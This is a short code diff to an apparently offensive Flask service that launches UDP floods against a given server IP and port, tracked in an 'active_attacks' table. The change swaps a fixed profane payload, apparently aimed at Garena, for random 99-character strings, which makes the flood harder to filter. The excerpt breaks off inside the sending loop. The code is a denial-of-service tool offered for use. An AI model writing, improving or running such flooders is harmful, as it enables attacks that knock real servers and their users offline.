@@ -1,13 +1,17 @@
 from flask import Flask, request, jsonify
 import threading
 import socket
+import random 
+import string
 
 app = Flask(__name__)
 active_attacks = {}
 
 def send_udp_packets(server_ip, server_port, stop_event):
     udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    message = "fuck_garena" * 99
+    random_text_number = ''.join(random.choices(string.ascii_letters + string.digits, k=99))
+    #message = "fuck_garena" * 99
+    message = random_text_number
 
     try:
         while not stop_event.is_set():
